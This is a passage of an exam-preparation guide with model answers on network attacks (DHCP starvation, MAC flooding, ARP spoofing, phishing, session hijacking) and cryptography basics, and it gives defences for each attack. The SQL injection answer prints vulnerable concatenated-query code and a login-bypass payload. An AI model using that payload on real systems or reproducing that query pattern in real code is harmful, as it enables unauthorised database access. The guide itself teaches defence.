    - **Modification** — altering a message in transit.
    - **Denial of Service** — blocking legitimate access.

    **Passive**
    - **Release of message contents** — reading the actual data.
    - **Traffic analysis** — even with encrypted content, observing who talks to whom, how often and how much, which can reveal a great deal.

    - Design principle: focus on PREVENTING passive attacks with encryption, and on DETECTING and RECOVERING from active attacks with integrity checks and monitoring.

19. **What is DHCP starvation and how DHCP starvation work with diagram? Write down the related attack introduced by DHCP starvation?** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 753 (ET: N/A)]*

Answer: **DHCP starvation** is a denial-of-service attack in which the attacker exhausts the DHCP server's pool of IP addresses by flooding it with requests carrying spoofed MAC addresses, so legitimate clients can no longer obtain an address.

    How it works
    ```mermaid
    flowchart TD
        A[Attacker] -->|1. flood DHCPDISCOVER<br/>with random spoofed MACs| D[DHCP Server]
        D -->|2. allocates a lease to each| D
        D -->|3. address pool exhausted| X[No addresses left]
        C[Legitimate client] -->|4. DHCPDISCOVER| D
        D -.->|5. no reply — pool empty| C
    ```

    - **Step 1** — the attacker runs a tool (Yersinia, dhcpstarv) that sends thousands of DHCPDISCOVER messages, each with a different randomly generated source MAC address.
    - **Step 2** — the DHCP server treats each as a new client and reserves an address for it.
    - **Step 3** — within seconds the entire scope is leased out to non-existent clients.
    - **Step 4** — a real client requesting an address gets no offer, so it cannot join the network.

    Related attack introduced by DHCP starvation — **the Rogue DHCP Server attack**
    - Starvation alone is only a denial of service. Its real purpose is to clear the way for a rogue server.
    - Once the legitimate server is exhausted, the attacker starts their own DHCP server on the LAN.
    - It answers clients with a valid IP but sets the **default gateway** and **DNS server** to the attacker's machine.
    - Every packet the client sends now passes through the attacker — a full **Man-in-the-Middle attack**, enabling sniffing, traffic modification and DNS-based redirection to fake sites.

    Prevention
    - **DHCP snooping** — mark only the port facing the real DHCP server as trusted; DHCP OFFER and ACK messages arriving on untrusted ports are dropped, blocking the rogue server.
    - **Rate limiting** DHCP messages on untrusted ports (`ip dhcp snooping limit rate 15`), which stops the starvation flood itself.
    - **Port security** limiting MAC addresses per port, so thousands of spoofed MACs cannot come from one port.
    - **802.1X** authentication so unauthorised devices never reach the LAN.
    - **Dynamic ARP Inspection** built on the DHCP snooping binding table.

20. **What is MAC flooding attack? What is the impact of this switch?** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 753 (ET: N/A)]*

Answer: MAC flooding is an attack that overflows a switch's CAM (MAC address) table by sending a rapid stream of frames with thousands of forged source MAC addresses.

    How the attack works
    - A switch normally learns which MAC address sits on which port and stores that mapping in a fixed-size CAM table.
    - The attacker sends frames with randomly generated source MACs, filling the table completely.
    - Legitimate entries are evicted to make room.

    Impact on the switch
    - **Fails open into hub mode** — when the switch receives a frame for a destination no longer in its CAM table, it must flood the frame out of every port. The switch effectively stops switching and starts broadcasting.
    - **Loss of confidentiality** — the attacker now receives copies of traffic intended for other hosts and can sniff passwords, emails and session cookies.
    - **Performance degradation** — every frame is broadcast, wasting bandwidth on all ports and increasing CPU load on every connected host.
    - **CPU and memory exhaustion** on the switch itself.
    - **Gateway to further attacks** — sniffed traffic enables session hijacking and Man-in-the-Middle attacks; it is often combined with ARP spoofing.
    - **Possible network instability or crash** in extreme cases.

    Prevention
    - **Port security** with a maximum MAC count per port and a violation action of `shutdown` or `restrict`.
    - **Sticky MAC learning** so the first learned address is bound to the port.
    - **802.1X** port-based authentication.
    - **VLAN segmentation** to limit exposure, and disabling unused ports.
    - **Traffic monitoring** to alert on abnormal CAM table growth.
    - **Encryption** so sniffed traffic remains unreadable even if the attack succeeds.

21. **(b) Distinguish between phishing and pharming. Give examples to explain.** *[BPSC Sub-Assistant Engineer (Ministry of Agriculture) 2021 compact it 801 (ET: N/A)]*

Answer: Both send the victim to a fake website to steal credentials, but they differ in HOW the victim gets there.

    | Point | Phishing | Pharming |
    |---|---|---|
    | Method | Tricks the user into clicking a malicious link | Redirects the user even when they type the correct address |
    | User action required | Yes — the victim must click something | No — the victim does nothing wrong |
    | Attack vector | Email, SMS, phone call, social media | DNS cache poisoning, compromised DNS server, altered hosts file |
    | Scale | One message reaches one inbox at a time | One poisoned DNS server redirects thousands of users at once |
    | URL in the address bar | Usually a slightly wrong domain, which a careful user may spot | The CORRECT domain, so nothing looks suspicious |
    | Detection by the user | Possible, by checking the link and sender | Almost impossible without checking the certificate |
    | Primary defence | Awareness, email filtering, MFA | DNSSEC, secure DNS, HTTPS certificate validation |
    | Danger level | Lower — depends on the user falling for it | Higher — the user cannot detect it by care alone |

    Examples

    **Phishing**
    - An email arrives appearing to come from a bank: "Your account will be suspended within 24 hours. Click here to verify." The link points to `www.dutch-bang1a.com` (with a digit "1" replacing the "l"). A careful user would notice the wrong domain.

    **Pharming**
    - The DNS resolver used by an office is poisoned. An employee correctly types `www.dutchbanglabank.com` in the browser, and the address bar shows exactly that — but the DNS answer points to the attacker's server, so a perfect replica of the login page appears. Nothing in the URL looks wrong.

    - Common defence for both: always check for HTTPS and a valid certificate. A pharming site cannot produce a certificate that a browser will accept for the real domain, so a certificate warning is the last line of defence.

22. **What is DDoS and SQL Injection attack?** *[Sonali Bank Ltd. Officer IT 2021 compact it 909 (ET: N/A)]*

Answer:

    **DDoS (Distributed Denial of Service)**
    - An attack that floods a target service from thousands of compromised machines — a botnet — so that legitimate users cannot access it.
    - Types: volumetric (UDP flood, DNS amplification), protocol (SYN flood), application layer (HTTP flood, Slowloris).
    - It attacks **availability** — nothing is stolen or altered, but the service is unusable.
    - Mitigation: DDoS scrubbing services, CDN, rate limiting, SYN cookies, over-provisioned bandwidth.

    **SQL Injection**
    - A web attack in which the attacker inserts malicious SQL code into an input field, so the database executes commands the developer never intended.
    - It works when user input is concatenated directly into a SQL query without validation.

    Example
    ```sql
    -- Vulnerable code
    query = "SELECT * FROM users WHERE username='" + input + "' AND password='" + pass + "'";

    -- Attacker enters this as the username:
    ' OR '1'='1' --

    -- The query becomes:
    SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''
    ```
    - `'1'='1'` is always true and `--` comments out the password check, so the attacker logs in without any password.

    Impact
    - Authentication bypass, reading the entire database, modifying or deleting records, and in some configurations executing operating system commands.

    Prevention
    - **Parameterised queries / prepared statements** — the single most effective fix, because data is never treated as code.
    - **Stored procedures** with parameters, **input validation** and whitelisting.
    - **Least-privilege database accounts** — the web application should never connect as `root` or `sa`.
    - **Web Application Firewall** as an additional layer, and generic error messages so the database structure is not revealed.

23. **Phishing attack এর মাধ্যমে কীভাবে attack করা হয়। উহার কারণে কি ক্ষতি হতে পারে?** *[NESCO Junior Assistant Manager (ICT) 2021 compact it 913 (ET: BUET)]*

Answer:

    (a) How a phishing attack is carried out
    - **Step 1 — Preparation.** The attacker registers a look-alike domain and builds a pixel-perfect copy of a real login page.
    - **Step 2 — Bait.** A message is sent by email, SMS or social media, impersonating a bank, employer or service provider, and creating urgency: "Your account will be blocked", "You have won a prize", "Verify immediately".
    - **Step 3 — Hook.** The victim clicks the link and reaches the fake page, or opens an attachment carrying malware.
    - **Step 4 — Harvest.** The victim enters username, password, card number or OTP, which goes straight to the attacker.
    - **Step 5 — Exploit.** The attacker logs into the real account, transfers money, or uses the credentials elsewhere because people reuse passwords.
    - Often the fake page then redirects to the genuine site, so the victim suspects nothing.

    (b) Damage it can cause

    **To an individual**
    - Direct financial loss from unauthorised transfers and card use.
    - Identity theft — loans and accounts opened in the victim's name.
    - Loss of personal data, photographs and private messages, sometimes leading to blackmail.
    - Account takeover of email, which then unlocks every other account through password reset.

    **To an organisation**
    - Large financial fraud, especially through Business Email Compromise where a finance officer is tricked into paying a fake invoice.
    - Data breach of customer records, with regulatory penalties.
    - Ransomware entry — most ransomware infections begin with a phishing email.
    - Reputational damage and loss of customer trust.
    - Operational disruption and incident response cost.
    - Legal liability under data protection rules.

    Prevention
    - Multi-factor authentication, staff awareness training with simulated phishing, email filtering with SPF/DKIM/DMARC, verifying any payment request through a second channel, and never sharing an OTP or PIN with anyone.

24. **Explain ARP Spoofing attack with diagram. Why ARP spoofing attacker used to launch Man-in-the-Middle attack.** *[SGFL Assistant General Engineer 2021 compact it 936 (ET: BUET)]*

Answer: ARP spoofing is an attack in which forged ARP reply messages are sent on a LAN to bind the attacker's MAC address to another host's IP address, so traffic for that host is delivered to the attacker.

    Diagram
    ```mermaid
    flowchart TD
        subgraph Before
        V1[Victim 192.168.1.10] -->|direct| G1[Gateway 192.168.1.1]
        end
        subgraph After ARP spoofing
        V2[Victim 192.168.1.10] --> A[Attacker 192.168.1.50]
        A --> G2[Gateway 192.168.1.1]
        A -.->|forged: gateway IP = my MAC| V2
        A -.->|forged: victim IP = my MAC| G2
        end
    ```

    How it works
    - **Step 1** — the attacker connects to the same LAN and identifies the victim and the gateway.
    - **Step 2** — sends a forged ARP reply to the victim: "192.168.1.1 is at [attacker's MAC]".
    - **Step 3** — sends a forged ARP reply to the gateway: "192.168.1.10 is at [attacker's MAC]".
    - **Step 4** — both caches are poisoned. All traffic between victim and gateway now flows through the attacker.
    - **Step 5** — the attacker enables IP forwarding, so packets still reach their destination and the victim notices nothing.

    Why it is the standard way to launch a MITM attack on a LAN
    - **ARP has no authentication.** Any host can send an unsolicited ARP reply and it will be believed. There is nothing to break — the protocol simply trusts.
    - **It requires no credentials** — only physical or wireless access to the same broadcast domain.
    - **It is transparent** — with IP forwarding enabled, connectivity is unaffected, so the user has no symptom to notice.
    - **It captures ALL traffic**, not just one application, because it operates below the IP layer.
    - **It is bidirectional** — poisoning both sides lets the attacker see and modify traffic in both directions.
    - **Tools are freely available** — Ettercap, arpspoof, Cain & Abel make it a few keystrokes.

    Prevention
    - **Dynamic ARP Inspection** with **DHCP snooping**, **static ARP entries** for critical hosts, **port security**, VLAN segmentation, and end-to-end encryption (HTTPS, SSH, VPN) so intercepted traffic is useless.

25. **Difference between spoofing and sniffing** *[Combined 4 Banks Assistant Programmer 2020 compact it 1002 (ET: DU)]*

Answer:

    | Point | Sniffing | Spoofing |
    |---|---|---|
    | Definition | Capturing and reading network traffic | Impersonating another identity |
    | Attack type | Passive — only observes | Active — creates or alters data |
    | Data modification | None | Yes, packets are forged |
    | Goal | Steal information | Gain trust, redirect traffic, bypass controls |
    | Victim awareness | Almost never detected | May be detected when something behaves oddly |
    | Security goal breached | Confidentiality | Authentication and Integrity |
    | Tools | Wireshark, tcpdump, Ettercap | Ettercap, hping3, arpspoof |
    | Main defence | Encryption | Authentication, filtering, DAI, DNSSEC |
    | Examples | Capturing packets on open Wi-Fi; MAC flooding to force a switch to broadcast | IP spoofing, ARP spoofing, MAC spoofing, DNS spoofing, email spoofing |

    Relationship between the two
    - They are usually combined. On a switched network, sniffing alone captures very little, because the switch sends traffic only to the intended port.
    - So the attacker first SPOOFS (ARP spoofing or MAC flooding) to redirect traffic to themselves, and then SNIFFS the redirected traffic.
    - Spoofing is the means; sniffing is the objective.

26. **Which security attacks (given) occur on client side or server side?** *[Microcredit Regulatory Authority Assistant Maintenance Engineer 2020 compact it 1033 (ET: BUET)]*

Answer: The specific list was not printed with the question, so the standard classification is given.

    **Client-side attacks** — execute in the user's browser or on the user's machine

    | Attack | How it targets the client |
    |---|---|
    | Cross-Site Scripting (XSS) | Malicious script runs in the victim's browser |
    | Cross-Site Request Forgery (CSRF) | The victim's browser is tricked into sending an authenticated request |
    | Clickjacking | An invisible frame captures the victim's clicks |
    | Drive-by download | Malware installs when a page is merely visited |
    | Phishing | The user is deceived into giving up credentials |
    | Session hijacking (cookie theft) | A stolen cookie is used from the attacker's browser |
    | Malicious browser extension | Runs with the user's privileges |

    **Server-side attacks** — execute on the web or database server

    | Attack | How it targets the server |
    |---|---|
    | SQL Injection | Malicious SQL runs against the server's database |
    | Command Injection | OS commands run on the server |
    | Remote Code Execution | Attacker's code runs on the server |
    | File inclusion (LFI / RFI) | The server reads or executes an unintended file |
    | Directory traversal | Files outside the web root are read from the server |
    | Server-Side Request Forgery (SSRF) | The server is made to send requests on the attacker's behalf |
    | Buffer overflow | Server memory is corrupted to run injected code |

    **Attacks affecting both or the network in between**
    - Man-in-the-Middle, DoS/DDoS, DNS spoofing, ARP spoofing, brute-force login attempts.

    Rule for deciding
    - Ask WHERE THE MALICIOUS CODE EXECUTES. If it runs in the victim's browser, it is client-side; if it runs on the server, it is server-side. XSS is client-side even though the payload is stored on the server, because it executes in another user's browser.

27. **Write down ten name of different attack through internet.** *[Sonali & Janata Bank Officer (IT/ICT) 2019 compact it 1105-1106 (ET: AUST)]*, *[Probashi Kallyan Bank Programmer 2019 compact it 1158 (ET: AUST)]*

Answer: Ten common internet-based attacks:

    - **Phishing** — impersonating a trusted party by email or SMS to steal credentials.
    - **Malware** — virus, worm, trojan or spyware installed to damage or spy on a system.
    - **Ransomware** — encrypts the victim's files and demands payment for the key.
    - **DoS / DDoS** — floods a service so legitimate users cannot reach it.
    - **Man-in-the-Middle (MITM)** — intercepts and possibly alters communication between two parties.
    - **SQL Injection** — inserts malicious SQL into an input field to read or destroy a database.
    - **Cross-Site Scripting (XSS)** — injects script into a web page that runs in other users' browsers.
    - **Password attack** — brute force, dictionary attack or credential stuffing to guess or reuse passwords.
    - **DNS spoofing / pharming** — poisons DNS so a correctly typed address leads to a fake site.
    - **Zero-day exploit** — attacks a vulnerability before any patch exists.

    Others worth naming
    - Session hijacking, ARP spoofing, drive-by download, cryptojacking, supply chain attack, social engineering, insider threat, and botnet recruitment.

28. **(d) Explain the principle of man in the middle and session hijacking attack with appropriate diagrams.** *[BPSC Assistant Programmer (CSE) 2019 compact it 1134-1136 (ET: N/A)]*

Answer:

    **(a) Man-in-the-Middle attack**
    - The attacker secretly positions themselves between two communicating parties, relaying and possibly altering the messages, while both believe they are talking directly to each other.

    ```mermaid
    flowchart LR
        A[Alice] -->|1. thinks she sends to Bob| M[Attacker]
        M -->|2. reads / modifies, forwards| B[Bob]
        B -->|3. thinks he replies to Alice| M
        M -->|4. reads / modifies, forwards| A
    ```

    Principle
    - The attack succeeds because there is **no authentication** of the endpoints. Neither party can verify who they are actually talking to.
    - Achieved by ARP spoofing, DNS spoofing, a rogue Wi-Fi access point, or SSL stripping.
    - Defence: end-to-end encryption with certificate validation (HTTPS/TLS), HSTS, VPN, DAI and DHCP snooping.

    **(b) Session hijacking attack**
    - The attacker takes over an ALREADY AUTHENTICATED session by stealing or predicting the session identifier, so no password is ever needed.

    ```mermaid
    flowchart TD
        U[User] -->|1. logs in with password| S[Server]
        S -->|2. issues session cookie ABC123| U
        A[Attacker] -.->|3. steals cookie ABC123<br/>by sniffing or XSS| U
        A -->|4. sends requests with ABC123| S
        S -->|5. accepts — thinks it is the user| A
    ```

    Principle
    - HTTP is stateless, so after login the server identifies the user only by a session token. Whoever holds that token IS the user as far as the server is concerned.
    - How the token is obtained: packet sniffing on an unencrypted connection, XSS reading `document.cookie`, session fixation (forcing a known session ID on the victim), or predicting a weakly generated ID.

    Defence
    - Always use **HTTPS**, so the cookie cannot be sniffed.
    - Mark cookies **HttpOnly** (blocks JavaScript access, defeating XSS theft) and **Secure** (never sent over HTTP), with **SameSite** set.
    - **Regenerate the session ID on login**, which defeats session fixation.
    - Use **long random session IDs**, short timeouts, and re-authentication for sensitive actions.
    - Bind the session to the client IP or device fingerprint where practical.

    Difference between the two
    - MITM intercepts the CHANNEL and can read everything from the start. Session hijacking steals the CREDENTIAL TOKEN and impersonates the user afterwards, often without ever seeing the traffic again.

29. **(b) What is DHCP Starvation Attack? Explain briefly.** *[BPSC Assistant Programmer (CSE) 2019 compact it 1138 (ET: N/A)]*

Answer: DHCP starvation is a denial-of-service attack in which the attacker exhausts the DHCP server's entire pool of IP addresses, so no legitimate client can obtain one.

    How it works
    - The attacker sends a rapid flood of DHCPDISCOVER messages, each carrying a different randomly generated (spoofed) source MAC address.
    - The DHCP server treats every one as a genuine new client and reserves an address for it.
    - Within seconds the whole scope is leased to non-existent clients.
    - A real client requesting an address receives no offer and cannot join the network.

    Why it matters — what follows
    - Starvation is usually only stage one. Once the legitimate server cannot respond, the attacker starts a **rogue DHCP server** which answers clients with a valid IP but a malicious **default gateway** and **DNS server**.
    - All client traffic then flows through the attacker, establishing a **Man-in-the-Middle** position for sniffing, modification and DNS redirection.

    Prevention
    - **DHCP snooping** — only the port facing the legitimate DHCP server is trusted; offers from any other port are dropped.
    - **Rate limiting** DHCP messages on untrusted ports, which stops the flood itself.
    - **Port security** limiting MAC addresses per port.
    - **802.1X** authentication so unauthorised devices cannot connect.

30. **Write down the name of different attack through internet.** *[Combined Bank (HBFC and BKB) Assistant Programmer 2018 compact it 1162 (ET: N/A)]*, *[Bangladesh Development Bank Senior Officer (IT) 2017 compact it 1219 (ET: N/A)]*

Answer: Internet attacks grouped by type.

    **Social engineering attacks**
    - Phishing, spear phishing, whaling, smishing (SMS), vishing (voice), pretexting, baiting.

    **Malware attacks**
    - Virus, worm, trojan horse, ransomware, spyware, adware, rootkit, keylogger, botnet, cryptojacking.

    **Network attacks**
    - DoS and DDoS, Man-in-the-Middle, ARP spoofing, MAC flooding, DNS spoofing/poisoning, IP spoofing, packet sniffing, session hijacking, DHCP starvation.

    **Web application attacks**
    - SQL Injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), directory traversal, file inclusion, command injection, clickjacking.

    **Password and access attacks**
    - Brute force, dictionary attack, credential stuffing, rainbow table attack, privilege escalation.

    **Other**
    - Zero-day exploit, supply chain attack, insider threat, drive-by download, buffer overflow, advanced persistent threat (APT).

31. **Briefly describe about DoS, IP address spoofing and Man-in-the-middle attacks.** *[BPDB Assistant Engineer (CSE) 2018 compact it 1215 (ET: N/A)]*

Answer:

    **(a) DoS — Denial of Service**
    - Makes a service unavailable to legitimate users by exhausting bandwidth, CPU, memory or the connection table.
    - Methods: SYN flood, UDP flood, ICMP flood, Ping of Death, Slowloris.
    - **DDoS** is the distributed form using a botnet of thousands of machines, which is far harder to filter because traffic comes from everywhere.
    - Attacks **availability**. Mitigation: rate limiting, firewalls and IPS, DDoS scrubbing services, CDN, SYN cookies.

    **(b) IP address spoofing**
    - The attacker forges the source IP address in packet headers so the packet appears to come from a trusted or different host.
    - **Uses**: hiding the real origin during a DoS attack; bypassing IP-based access control lists; enabling amplification attacks, where a small spoofed request to a DNS or NTP server sends a large reply to the victim.
    - **Limitation for the attacker**: replies go to the spoofed address, not back to them, so spoofing suits one-way floods rather than interactive sessions.
    - **Prevention**: ingress and egress filtering (BCP 38) at the ISP, reverse path forwarding checks, and authentication that does not rely on source IP alone.

    **(c) Man-in-the-Middle attack**
    - The attacker secretly relays and possibly alters communication between two parties who believe they are talking directly.
    - **Methods**: ARP spoofing, DNS spoofing, rogue Wi-Fi access point, SSL stripping, session hijacking.
    - **Impact**: credential theft, transaction modification, malware injection.
    - **Prevention**: HTTPS/TLS with certificate validation, HSTS, VPN, Dynamic ARP Inspection, DHCP snooping, DNSSEC, and multi-factor authentication.

    - Relationship: IP spoofing is a TECHNIQUE that supports both of the others — it hides the source in a DoS flood and helps impersonate a trusted host in a MITM setup.

32. **What is MAC Flood in Switch? How attacker gets benefitted from it?** *[BTCL Assistant Manager (Technical) 2017 compact it 1255 (ET: N/A)]*

Answer: MAC flooding is an attack that overflows a switch's CAM (MAC address) table by sending thousands of frames with forged source MAC addresses, forcing the switch to abandon selective forwarding.

    How it works
    - A switch keeps a fixed-size table mapping MAC addresses to ports.
    - The attacker floods it with random source MACs until the table is full.
    - Legitimate mappings are evicted.
    - With no entry for a destination, the switch must **flood** every frame out of all ports — it behaves like a hub.

    How the attacker benefits
    - **Traffic sniffing** — the attacker now receives copies of frames intended for other hosts, and can capture unencrypted passwords, emails, FTP credentials and session cookies.
    - **Session hijacking** — captured session cookies allow the attacker to impersonate a logged-in user without a password.
    - **Reconnaissance** — seeing all LAN traffic reveals the network layout, servers, protocols in use and naming conventions, which guides the next stage of attack.
    - **Man-in-the-Middle preparation** — combined with ARP spoofing, this becomes full interception with the ability to modify traffic.
    - **Denial of Service side effect** — flooding every port degrades performance for everyone and can crash the switch.
    - **Bypasses VLAN separation in some cases**, if the switch fails open badly.

    Prevention
    - **Port security** — limit MAC addresses per port with a violation action of shutdown or restrict. This is the direct fix.
    - **Sticky MAC** binding, **802.1X** authentication, **VLAN segmentation**, disabling unused ports, monitoring CAM table size, and encryption so that captured traffic is unreadable.

## Cryptography (31)

1. **Explain the operational difference between Hashing and Encryption. [SO IT 25-07-2026]** *[DESCO Assistant Engineer (CSE) 10.09.2022 compact it 701 (ET: BUET)], [BKSP Assistant Programmer 03.12.2022 compact it 730 (ET: N/A)]*

Answer: The core difference is reversibility. Encryption is a TWO-WAY process designed to be undone; hashing is a ONE-WAY process designed never to be undone.

   | Point | Encryption | Hashing |
   |---|---|---|
   | Direction | Two-way — reversible with the key | One-way — cannot be reversed |
   | Key required | Yes, for both encryption and decryption | No key |
   | Output length | Same size as input or larger | Fixed length, regardless of input size |
   | Purpose | Confidentiality — keep data secret | Integrity — prove data has not changed |
   | Recovering the original | Possible with the correct key | Impossible; can only compare hashes |
   | Same input twice | May give different output (with a random IV) | Always gives the identical output |
   | Algorithms | AES, DES, 3DES, RSA, Blowfish | MD5, SHA-1, SHA-256, SHA-512, bcrypt |
   | Typical use | Encrypting a message, file or database column | Password storage, file integrity check, digital signature |

   Operational example
   - **Encryption**: `"Hello"` + key → `"X8#kL2p"` → decrypt with the key → `"Hello"` again.
   - **Hashing**: `"Hello"` → `185f8db32271fe25...` (64 hex characters for SHA-256). There is no way to get `"Hello"` back from that value.

   Why passwords are HASHED, not encrypted
   - If a password database is stolen, encrypted passwords can be decrypted once the key is found. Hashed passwords cannot be reversed at all.
   - Login works by hashing the entered password and comparing the two hashes — the system never needs to know the actual password.
   - A **salt** (a random value added before hashing) is used so that two users with the same password get different hashes, defeating rainbow tables.

2. **Explain the concepts of encryption and decryption with an example.** *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*

Answer:
   - **Encryption** converts readable data (plaintext) into an unreadable form (ciphertext) using an algorithm and a key.
   - **Decryption** reverses that process, converting ciphertext back to plaintext with the correct key.

   ```
   Plaintext  --[Encryption algorithm + Key]-->  Ciphertext
   Ciphertext --[Decryption algorithm + Key]-->  Plaintext
   ```

   Simple example — Caesar cipher with a shift of 3
   - Plaintext: `HELLO`
   - Encryption: each letter moves 3 places forward → `KHOOR`
   - Anyone intercepting sees only `KHOOR`, which is meaningless.
   - Decryption: each letter moves 3 places back → `HELLO`

   Real-world example — online banking
   - The customer types their password on the bank's HTTPS page.
   - The browser encrypts it with a session key before it leaves the machine.
   - It travels the internet as ciphertext, so anyone sniffing the network sees only random bytes.
   - The bank's server decrypts it with the same session key and verifies it.

   Two types
   - **Symmetric** — one key both encrypts and decrypts. Fast, used for bulk data. AES, DES.
   - **Asymmetric** — a public key encrypts and a private key decrypts. Slower, but solves key distribution. RSA, ECC.
   - HTTPS uses both: asymmetric encryption to exchange a session key, then symmetric encryption for the actual data.

3. **What is social engineering? What is hashing? How is it different from encryption?** *[Combined Bank Officer (IT) 03.01.2026 debug it (ET: N/A)]*

Answer:

   (a) Social engineering
   - The art of manipulating PEOPLE into revealing confidential information or performing actions that compromise security. It attacks human psychology rather than technology.
   - Techniques: phishing, vishing (phone), smishing (SMS), pretexting (inventing a scenario), baiting (a malware-loaded USB left in a car park), tailgating (following someone through a secure door), and quid pro quo.
   - It exploits trust, fear, urgency, authority and curiosity.
   - Defence: awareness training, verification through a second channel, strict procedures for payment and credential requests, and multi-factor authentication.

   (b) Hashing
   - A one-way mathematical function that converts input of any size into a fixed-length string called a hash or digest.
   - Properties: deterministic (same input always gives the same hash), fast to compute, infeasible to reverse, collision resistant, and exhibiting the **avalanche effect** (a one-bit change in input completely changes the output).
   - Algorithms: MD5 (128-bit, broken), SHA-1 (160-bit, deprecated), SHA-256 and SHA-512 (secure), bcrypt and Argon2 (designed for passwords).
   - Uses: password storage, file integrity verification, digital signatures, blockchain.

   (c) Difference from encryption

   | Point | Hashing | Encryption |
   |---|---|---|
   | Reversible | No | Yes, with the key |
   | Key needed | No | Yes |
   | Output size | Fixed | Varies with input |
   | Goal | Integrity | Confidentiality |
   | Example use | Storing a password | Sending a secret message |

4. **What is Encryption? What are the types? Explain the role of Encryption in security.** *[Senior Officer IT (Job ID: 10225) Date: 22-05-2026 (ET: N/A)]*

Answer:

   (a) Encryption
   - The process of converting plaintext into ciphertext using an algorithm and a key, so that only someone with the correct key can read it.

   (b) Types

   **By key structure**
   - **Symmetric encryption** — one shared secret key for both encryption and decryption. Fast, ideal for bulk data. Examples: AES, DES, 3DES, Blowfish. Problem: securely distributing the key.
   - **Asymmetric encryption** — a public key encrypts and a private key decrypts. Solves key distribution and enables digital signatures. Slow, so it is used only on small data. Examples: RSA, ECC, Diffie-Hellman.

   **By data state**
   - **Encryption at rest** — stored data: full-disk encryption, database column encryption.
   - **Encryption in transit** — data moving over a network: TLS/HTTPS, VPN.
   - **End-to-end encryption** — only the two endpoints can read it; even the service provider cannot. WhatsApp, Signal.

   **By operation**
   - **Block cipher** — encrypts fixed-size blocks (AES uses 128-bit blocks).
   - **Stream cipher** — encrypts one bit or byte at a time (RC4, ChaCha20).

   (c) Role of encryption in security
   - **Confidentiality** — the primary role. Intercepted data is unreadable.
   - **Integrity** — combined with hashing (as in AES-GCM), it detects tampering.
   - **Authentication** — digital certificates prove a server's identity in HTTPS.
   - **Non-repudiation** — a digital signature proves who sent a message and prevents them denying it.
   - **Regulatory compliance** — PCI DSS, GDPR and the Bangladesh Bank ICT Security Guideline all mandate encryption of sensitive data.
   - **Safe communication over untrusted networks** — makes public Wi-Fi and the open internet usable for banking.
   - **Protection after a breach** — encrypted stolen data is worthless to the attacker.

   - Limitation to state: encryption protects DATA, not the endpoints. Weak key management, stolen keys and compromised devices defeat it entirely.

5. **Write the differences among encryption, hashing, and digital signatures. Mention their uses in cybersecurity.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

Answer:

   | Point | Encryption | Hashing | Digital Signature |
   |---|---|---|---|
   | Direction | Two-way, reversible | One-way, irreversible | One-way verification |
   | Key used | Symmetric or asymmetric key | No key | Sender's PRIVATE key to sign, PUBLIC key to verify |
   | Output | Ciphertext, size varies | Fixed-length digest | A signature block attached to the message |
   | Main goal | Confidentiality | Integrity | Authentication, integrity and non-repudiation |
   | Can the original be recovered | Yes, with the key | Never | Not applicable — the message travels alongside |
   | Algorithms | AES, RSA, 3DES | SHA-256, MD5, bcrypt | RSA, DSA, ECDSA |

   How a digital signature COMBINES the other two
   - The sender hashes the message → gets a digest.
   - The sender encrypts that digest with their PRIVATE key → this is the signature.
   - The receiver decrypts the signature with the sender's PUBLIC key → recovers the digest.
   - The receiver independently hashes the received message and compares the two digests.
   - If they match, the message is unaltered (integrity) and it genuinely came from the holder of the private key (authentication and non-repudiation).

   Uses in cybersecurity

   **Encryption**
   - HTTPS/TLS for web traffic, VPN tunnels, full-disk encryption, encrypted databases, end-to-end messaging.

   **Hashing**
   - Password storage (with salt), file integrity checking and malware detection, blockchain block linking, HMAC for message authentication, digital forensics evidence integrity.

   **Digital signatures**
   - SSL/TLS certificates, signed software updates (so malware cannot masquerade as an update), e-tendering and e-GP documents, legally binding electronic contracts, and blockchain transactions.

6. **How many bits MD5 encryption?** *[BARI Assistant Maintenance Engineer 15.11.2025 compact it 1451 (ET: N/A)]*

Answer: **MD5 produces a 128-bit hash value** (16 bytes), usually written as 32 hexadecimal characters.

   - MD5 stands for **Message Digest algorithm 5**, designed by Ron Rivest in 1991.
   - Note the terminology: MD5 is a HASH function, not encryption. It is one-way and uses no key.
   - Example: `MD5("hello")` = `5d41402abc4b2a76b9719d911017c592`

   Comparison of hash sizes

   | Algorithm | Output size | Status |
   |---|---|---|
   | MD5 | 128 bits | **Broken** — collisions found in 2004, do not use for security |
   | SHA-1 | 160 bits | Deprecated — collision demonstrated in 2017 |
   | SHA-256 | 256 bits | Secure, widely used |
   | SHA-512 | 512 bits | Secure |
   | bcrypt / Argon2 | variable | Designed specifically for passwords |

   - MD5 is still acceptable for non-security uses such as checksums to detect accidental file corruption, but never for passwords or signatures.

7. **What type of key used for decrypt message of PKI?** *[BARI Assistant Maintenance Engineer 10.05.2024 compact it 1462 (ET: N/A)]*

Answer: In PKI (Public Key Infrastructure), a message is decrypted with the **receiver's PRIVATE key**.

   How the key pair is used
   - The **sender encrypts** with the receiver's **PUBLIC key** — which is freely available to everyone.
   - The **receiver decrypts** with their own **PRIVATE key** — which never leaves the receiver.
   - Only the private key can undo what its matching public key encrypted, which is what makes the scheme secure.

   | Operation | Key used |
   |---|---|
   | Encrypt a message | Receiver's PUBLIC key |
   | Decrypt a message | Receiver's PRIVATE key |
   | Create a digital signature | Sender's PRIVATE key |
   | Verify a digital signature | Sender's PUBLIC key |

   - Note the reversal for signatures: encryption uses the receiver's keys, signing uses the sender's keys. Confusing these two is the most common mistake in this topic.
   - PKI components: Certificate Authority (CA) which issues certificates, Registration Authority (RA), digital certificates (X.509), and the Certificate Revocation List (CRL).

8. **6.2 Explain the operational difference between Hashing and Encryption.** *[Bangladesh Bank Senior Officer (IT), Grade-9 (Job ID-25104) 2024 (ET: N/A)]*

Answer: Operationally, encryption is designed to be UNDONE and hashing is designed never to be undone.

   | Aspect | Encryption | Hashing |
   |---|---|---|
   | Operation | Plaintext → ciphertext → plaintext | Input → digest, and stops there |
   | Reversibility | Reversible with the correct key | Mathematically irreversible |
   | Key | Required | None |
   | Output size | Proportional to input | Always fixed (SHA-256 → 256 bits, whatever the input) |
   | Determinism | Same input may give different ciphertext, if a random IV is used | Same input always gives the identical digest |
   | Security goal | Confidentiality | Integrity |
   | Verification method | Decrypt and read | Re-hash and compare digests |

